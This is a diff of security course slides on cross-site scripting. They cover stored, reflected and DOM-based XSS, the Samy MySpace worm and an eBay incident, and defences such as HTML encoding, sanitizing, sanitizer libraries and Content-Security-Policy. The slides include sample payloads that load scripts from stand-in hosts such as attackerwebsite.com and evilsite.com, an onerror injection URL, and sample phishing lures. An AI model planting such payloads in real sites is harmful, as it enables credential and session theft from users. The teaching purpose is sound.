@@ -25,11 +25,12 @@ Notes:
 ## Cross Site Scripting (XSS)
 
 - A form of injection attack
-- Malicious scripts are injected into a response from a trusted website
-  - Because the script is from a trusted source, the user's browser executes it as trusted code
-  - There is no way for the browser to tell the script originated from an untrusted source
-  - The XSS script has the same level of trust as the website
-- Often used to access session tokens, cookies and other information stored in the user's browser
+- Malicious scripts are injected into an HTTP response from a trusted website
+- Because the script is from a trusted source, the user's browser executes it as trusted code
+- The browser cannot determine that the script originated from an untrusted source
+- The XSS script has the same level of trust as the website the HTTP response originated from
+- XSS is a common attack for stealing information stored in the user's browser 
+- And for "drive-by" installation of malware on a computer
 
 
 Notes:
@@ -42,17 +43,22 @@ Notes:
   - _Stored XSS:_ Also referred to as persistent or Type I attacks
   - _Reflected XSS:_ Also referred to as Type II attacks
   - _DOM XSS:_ Also referred to as Type 0 attacks
-  
+- XSS attacks rely on users clicking on a link to an infected URL
+- Social Engineering refers to the manipulative methods used to induce users to take some action to trigger the XSS attack
+  - Email phishing is one of the most common
+  - Potential victims are sent an email with the infected URL and a deceptive description 
+  - Eg. _Limited time promotion: claim your $100 discount on your next Amazon purchase!!_
+  - The source of the email is usually spoofed or made to look like a legitimate sender the victim would trust
 ---
 
 ## Persistent XSS Attack
 
 - An attacker injects or inserts a malicious script payload into a trusted website
-  - Vulnerable websites assume the input is not executable code
-  - Typical inject points are blog comments and other user generated content
-- A user accessing the infected page will download the script payload in the HTTP response
-  - The user's browser executes the code since it is from a trusted website
-- Social Engineering (email phishing for example) is often used to trick users into visiting the infected page
+- Vulnerable websites fail to check if the input is executable code
+- Typical injection targets are blog comments and other user generated content
+- A victim accessing the infected page will download the script payload in the HTTP response
+- The victim's browser executes the XSS payload code as it loads the HTTP response
+- Email phishing is usually used to trick users into visiting the infected URL
 
 Notes:
 
@@ -69,18 +75,18 @@ Image credit: https://spanning.com/blog/cross-site-scripting-web-based-applicati
 ---
 ## Persistent XSS Attack Example
 
-- A trusted blog allows users to post comments
-- An attacker posts the following comment which contains a malicious script payload
+- A trusted blog allows users to post comments exactly as entered by the users
+- An attacker posts the following comment which contains a malicious payload
 
 ```html
 Well thought out essay, loved it!!
 <script>http://attackerwebsite.com/maliciousscript.js</script>
 ```
 
-- When a user goes to the page containing the comment, the user's browser executes the payload
+- When a victim goes to the page containing the comment, the payload in the comment executes
 - The attack payload remains in persistent storage on the server
-- Multiple users may become targets of the attack
-- Phishing is used to direct uses deceptively to the payload
+- Multiple users may become victims of the attack
+- Phishing is used to deceptively direct victims to the URL containing the payload
 - _OMG!!!, can you believe what this guy wrote!!! (link to payload comment)_
 
 
@@ -88,9 +94,9 @@ Well thought out essay, loved it!!
 ## Sammy's Worm
 
 - Sammy's worm was an early (2005) worm that propagated through the MySpace user community by using an XSS attack
-  - The worm displayed the message "Sammy is my hero,"then sent a friend request to the author Sammy Kamkar
-  - When an infected profile page was viewed, the payload would be replicated on the viewer's MySpace page
-  - Within 20 hours, the worm was on one million MySpace pages - Sammy was arrested shortly after
+- The worm displayed the message "Sammy is my hero," then sent a friend request to the author Sammy Kamkar
+- When an infected profile page was viewed, the payload would be replicated on the viewer's MySpace page
+- Within 20 hours, the worm was on one million MySpace pages - Sammy was arrested shortly after
 - A code fragment from the attack is shown below - notice where the XSS payload is located
 ```html
 but most of all Sammy is my hero
@@ -98,6 +104,18 @@ but most of all Sammy is my hero
      style="background:url('javascript:eval(document.all.mycode.expr)')" expr="payload_code" ...
 ```
 ---
+
+## Reflected XSS Attack
+
+- A victim is induced to click on a malformed URL to a trusted website 
+- The malformed URL is crafted to produce some sort of error HTTP response
+- The attack payload is part the malformed URL
+- Vulnerable websites will echo the attack payload as part of the HTTP  response
+- When the response is opened in the victim's browser, the payload executes
+- This has the effect of "bouncing" the attack payload off of a trusted website
+
+---
+
 
 ## Reflected XSS Attack
 
@@ -109,15 +127,6 @@ Image Credit: https://medium.com/iocscan/reflected-cross-site-scripting-r-xss-b0
 
 ---
 
-## Reflected XSS Attack
-
-- A user is tricked into clicking on a malformed URL to a trusted website via Social Engineering 
-  - Common attack vector is to send the link in an email with a deceptive link description
-- The payload is in the malformed URL
-  - Vulnerable websites will return the payload as part of the error response
-  - When the response is opened in the user's browser, the payload executes
----
-
 ## Reflected XSS Attack Example
 
 - An attacker sends a link to a target in email which looks like:
@@ -125,14 +134,27 @@ Image Credit: https://medium.com/iocscan/reflected-cross-site-scripting-r-xss-b0
 ```html
     https://vulnerablewebsite.com?q=news<\script%20src=”http://evilsite.com/payload.js"
 ```
-- The URL description will be deceptive, like "New info that will affect your account"
+- Along with a deceptive description like _Please review this suspicious transaction on your account_
 - A vulnerable website will return the unfiltered content of the query in the error message
 
 ```html
 Error!!
     <script type=’text/javascript’>payload</script> not found.
 ```
-- Once the error page is loaded, the payload is executed in the victim's browser even though it is inside an error message
+- When the error page is loaded, the payload is executed in the victim's browser
+
+---
+
+
+## DOM XSS Attack
+
+- The attack payload is executed by modifying the DOM “environment” in the victim’s browser
+- The modification causes the original client side script to run in an “unexpected” manner
+- The HTTP responses is not affected, the HTML does not contain the attack payload
+- The payload is in the body of the page as part of the DOM tree
+- The client side code now executes differently because of the DOM modification
+- Generally executed by injecting malicious code as parameters or URI fragments
+- The malicious code is then incorporated into the existing page code
 
 ---
 
@@ -144,21 +166,10 @@ Notes:
 
 Image Credit: https://medium.com/iocscan/dom-based-cross-site-scripting-dom-xss-3396453364fd
 
-___
-
-
-
-## DOM XSS Attack
-
-- The malicious load is executed by modifying the DOM “environment” in the victim’s browser
-- This causes the original client side script to run in an “unexpected” manner
-- The HTTP response is not affected, the returned page contains the altered script 
-- The client side code executes differently because of the modifications to the script in the DOM environment
-- The attack injects malicious code as parameters or URI fragments
 
 ---
 
-## DOM XSS Attack Example #1 - Parameter Insertion 
+## Example #1 - Parameter Insertion 
 
 - A website allows users to select their language but uses English as the default:
 
@@ -178,10 +189,10 @@ Select your language:
 
     </script></select>
 ```
-- The important thing to note is that the URI fragment "default=English" becomes part of the script
+- Note that the URI parameter "default=English" becomes part of the script
 
 ---
-## DOM XSS Attack Example #1 - Parameter Insertion
+## Example #1 - Parameter Insertion
 
 - The attacker social engineers a victim to click on an altered link:
 
@@ -189,19 +200,19 @@ Select your language:
   http://TrustedWebsite.com/page.html?default=<script>payload</script>
 ```
 - The original Javascript code in the page does not expect the default parameter to contain HTML markup
-  - The markup is decoded and written into the page's DOM at runtime
-  - The browser then renders the infected page and executes the attacker’s script
-- The HTTP response does not contain the payload
-  - This payload executes as part of the original client-side script at runtime
+- The markup is decoded and incorporated into the page's existing code
+- When browser renders the infected page, the incorporated attack payload is executed
+- The HTTP HTML response does not contain the payload
+- This payload is delivered in a modified client-side script
 
 ---
 
-## DOM XSS Attack Example #2 - URI Fragment
+## Example #2 - URI Fragment
 
 ![](../images/DOMXSS2.png)
 
 - The example above is a typical Single Page Application where the current user selection is indicated by a URI fragment
-  - The user has selected image 2 so the URL is:
+- The user has selected image 2 so the URL is:
 ```html
   https://xss-game.appspot.com/level3/frame#2
 ```
@@ -212,15 +223,15 @@ Select your language:
 
 ---
 
-## DOM XSS Attack Example #2 - URI Fragment
+## Example #2 - URI Fragment
 
-- Calculating the current page is all done clients side (like in Angular applications for example)
-- One way to perform a DOM XSS attack is to cause the underlying code to throw an error and then have our own error handler execute malicious code
+- Determining the current page is done in the browser without accessing the server
+- A DOM XSS attack would be to cause the underlying code to throw an error and supply error handler that executes the attack payload
 ```html
   https://xss-game.appspot.com/level3/frame#xxx' onerror='payload()'
 ```
 - The _onerror_ executes whatever JavaScript immediately follows it
-- This link can now be socially engineered so that a user will click on it and the exploit will execute
+- When this link is visited by a victim, the exploit will execute
 
 
 Notes:
@@ -233,19 +244,19 @@ Notes:
 
 - In 2014, hackers exploited an XSS vulnerability in the eBay website
 - Users were redirected to a fake login page used to harvest their login credentials
-- _eBay redirect attack puts buyers' credentials at risk_ https://www.bbc.com/news/technology-29241563
+-BBC Report: _eBay redirect attack puts buyers' credentials at risk_ https://www.bbc.com/news/technology-29241563
 - Other companies suffering major XSS attacks are Minecraft, Wordpress, Adobe and others
 
 ---
 
 ## Defences Against XSS Attacks
 
-- XSS relies on social engineering like phishing attacks to get users to click on the link provided by the attacker
+- XSS relies on social engineering like phishing attacks to get victims to click on the link provided by the attacker
   - First line of defence is to train users to _not_ click on unvetted links in emails or posts
-  - Email filtering to block links or to only allow whitelisted links through
-- The primary defence against XSS is to remove the website vulnerabilities that allow the injection of malicious code
+  - Email filtering can block links or to allow only whitelisted links
+- The primary website defence against XSS is to remove the website vulnerabilities that allow the injection of malicious code
   - For persistent XSS, this means not allowing code to inserted as if it were data
-  - For reflected XSS, this means not allowing user supplied html in website responses
+  - For reflected XSS, this means not allowing user supplied HTML in website responses
   - For DOM XSS, this means that all potential invalid or unexpected inputs are handled correctly
 
 ---
@@ -253,8 +264,8 @@ Notes:
 ## HTML Encoding
 
 - HTML encoding is the process of replacing HTML special characters with a coded replacements
-  - This allows HTML to be treated as text and NOT markup by the browser
-  - For example "<" is encoded as "&lt;"
+  - This forces HTML to be treated as raw text and NOT as executable markup by the browser
+  - For example "<" is encoded as "\&lt;"
 - In the persistent XSS example, the injected payload was
 ```html
 Well thought out essay, loved it!!
@@ -267,11 +278,11 @@ Well thought out essay, loved it!!
 ```
 ---
 
-## Some Defences Against XSS
+## Other Defences Against XSS
 
-- All untrusted data can be inserted only in specified locations
-  - Untrusted means that the content originated other than from a trusted source like our database or application
-- No untrusted data is used as content in an HTML element without being HTML encoded
+- Any content that does not come from trusted sources is flagged as _untrusted content_
+- Any untrusted content should be inserted only in specified and monitored locations
+- No untrusted content is used as content in an HTML element without being HTML encoded
   - This ensures the content is treated as data and not as markup
 - All attribute values must be attribute encoded
   - Attribute encoding is a subset of HTML encoding 
@@ -280,26 +291,27 @@ Well thought out essay, loved it!!
 
 ---
 
-## Some Defences Against XSS
+## Other Defences Against XSS
 
-- Sanitize all untrusted input
+- Sanitize all untrusted content
 - If some HTML markup is allowed in untrusted input, sanitizing removes all the illegal input
 - For example, a comment section for a blog allows `<b>`, `<i>` and `<hr>` tags
-  - The uploaded HTML is
-
+- The uploaded HTML is
 ```html
-<b>Well thought out essay, loved it!!</b>
-<script>http://attackerwebsite.com/maliciousscript.js</script>
+    <b>Well thought out essay, loved it!!</b>
+    <script>http://attackerwebsite.com/maliciousscript.js</script>
 ```
 - The sanitized versions is
 ```html
-<b>Well thought out essay, loved it!!</b>
+    <b>Well thought out essay, loved it!!</b>
 ```
+- Any untrusted content included in HTTP responses should be sanitized to prevent XSS reflection attacks
 ---
 
 ## Sanitizing Libraries
 
-- Some examples of available sanitizing libraries
+- There are multiple libraries that can be used for code sanitization
+- Some standard libraries are:
 - HTML sanitizer from _Google Closure Library_ (JavaScript/Node.js, docs)
   - https://developers.google.com/closure/library/
 - DOMPurify (JavaScript, requires jsdom for Node.js)
@@ -336,12 +348,13 @@ Content-Security-Policy: default-src: 'self'; script-src: 'self' static.domain.t
 
 ## Client Side Attacks
 
-- The primary method used in a client side attack is a Trojan
-  - Trojans are malicious code masquerading a trusted application
+- The primary vector used in a client side attack is a Trojan
+  - Trojans are malicious code masquerading a trusted application or modify existing trusted applications
   - One of the most common client side attacks
-  - Enables other attacks like session hijacking and manipulator in the middle
-- Other client side attacks are worms and viruses
-  - Not normally used in targeted attacks so we won't discuss them in this session
+  - Enables other attacks like _session hijacking_ and _manipulator in the middle_
+- Other client side attack components are worms and viruses
+  - Worms and viruses are used to propagate malware across systems
+  - The payload of a worm or virus is often a Trojan
   
 ![](../images/TrojansVirusesWorms.png)
 
